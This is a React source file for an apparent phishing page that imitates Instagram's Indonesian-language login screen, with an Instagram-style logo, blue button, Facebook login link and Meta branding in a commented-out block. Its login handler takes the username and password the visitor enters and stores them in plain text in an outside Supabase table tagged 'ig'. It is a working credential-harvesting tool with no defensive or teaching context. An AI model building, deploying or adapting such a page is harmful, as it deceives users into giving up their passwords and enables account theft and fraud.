import { useState } from "react";
import Logo from "./assets/typography.png";
import Facebook from "./assets/facebook.png";
import { Link } from "react-router-dom";
import { supabase } from "./supabaseClient";

function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async () => {
    // Perform any validation or checks you need before inserting data into the database
    try {
      const { data, error } = await supabase
        .from("test")
        .insert([{ username: username, psw: password, acc: "ig" }])
        .select();

      // Handle success or error here
      if (error) {
        console.error("Error inserting data:", error);
      } else {
        console.log("Data inserted successfully:", data);
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  console.log("hehe");

  return (
    <div className="min-h-screen w-full flex flex-col justify-start items-center space-y-4 py-6">
      <img src={Logo} alt="" className="w-44" />

      <div className="w-full flex flex-col gap-3 max-w-xs">
        <input
          type="text"
          required
          className="w-full border-2 bg-[#FAFAFA] text-xs py-3 rounded-sm px-3 outline-none"
          placeholder="Nomor telepon, nama pengguna, atau email"
          onChange={(e) => setUsername(e.target.value)}
        />
        <input
          type="password"
          required
          placeholder="Kata Sandi"
          onChange={(e) => setPassword(e.target.value)}
          className="w-full border-2 bg-[#FAFAFA] text-xs py-3 rounded-sm px-3 outline-none"
        />
        <button
          onClick={handleLogin}
          className="bg-[#4CB5F9] text-white font-semibold py-2.5 rounded-xl"
        >
          Masuk
        </button>
        <div className="w-full flex flex-row justify-center items-center gap-3">
          <div className="w-full border border-b-0"></div>
          <h1 className="font-semibold text-gray-600 text-sm">ATAU</h1>
          <div className="w-full border border-b-0"></div>
        </div>
        <div className="flex flex-col justify-center items-center my-10 space-y-5">
          <Link to={"/login-facebook"}>
            <span className="flex flex-row">
              <img src={Facebook} alt="" className="w-8" />
              <p className="font-semibold text-[#385185]">
                Masuk dengan Facebook
              </p>
            </span>
          </Link>
          <div>
            <a href="" className="text-sm">
              Lupa kata sandi?
            </a>
          </div>
        </div>
        <div>
          <p className="text-center ">
            Tidak punya akun?{" "}
            <span className="font-semibold text-[#4CB5F9]">Buat akun</span>
          </p>
        </div>
      </div>
    </div>
  );
}

export default Login;

// import { useState } from "react";
// import reactLogo from "./assets/react.svg";
// import viteLogo from "/vite.svg";
// import Typography from "./assets/typography.png";
// import Meta from "./assets/meta.png";
// import { Button } from "@chakra-ui/react";

// function App() {
//   return (
//     <>
//       {/* <div className="min-h-screen flex flex-col justify-between items-center w-full">
//         <div>
//           <p className="text-gray-400">Bahasa Indonesia</p>
//         </div>
//         <div className="w-full flex flex-col justify-center items-center ">
//           <img className="max-w-xs" src={Typography} alt="" />
//           <div className="w-full flex flex-col space-y-5">
//             <h1 className="font-semibold text-xl">
//               Daftar untuk melihat <span>foto</span> dan <span>video</span> dari
//               teman Anda.
//             </h1>
//             <button className="bg-[#4CB5F9] text-white w-full rounded-md py-3 font-bold text-sm">
//               Dapatkan aplikasi Instagram
//             </button>
//             <p className="text-gray-400 text-sm">
//               <span className="text-blue-600 font-semibold">Masuk</span> atau{" "}
//               <span className="text-blue-600 font-semibold">Daftar</span>
//             </p>
//           </div>
//         </div>
//         <div>
//           <p>from</p>
//           <img className="w-20" src={Meta} alt="" />
//         </div>
//       </div> */}
//     </>
//   );
// }

// export default App;
